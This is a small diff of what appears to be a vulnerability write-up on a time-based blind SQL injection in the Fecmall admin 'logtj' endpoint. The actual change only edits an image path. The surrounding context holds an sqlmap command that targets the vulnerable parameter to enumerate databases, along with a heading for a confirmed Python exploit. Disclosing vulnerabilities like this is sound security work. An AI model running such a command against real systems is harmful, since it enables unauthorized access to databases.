@@ -56,7 +56,7 @@ sqlmap -u "http://target/fecadmin/logtj/index?account=admin" \
   --dbms=mysql --technique=T --time-sec=5 --batch --dbs
 ```
 
-![image-20260526165818426](D:/BaiduSyncdisk/pentest/codereview/fecshop/FEC-004_logtj_SQLi_issue.assets/image-20260526165818426.png)
+![image-20260526165818426](Fecmall%20SQLi%20logtj.assets/image-20260526165818426.png)
 
 ### Python Time-Based Blind (Confirmed)
 
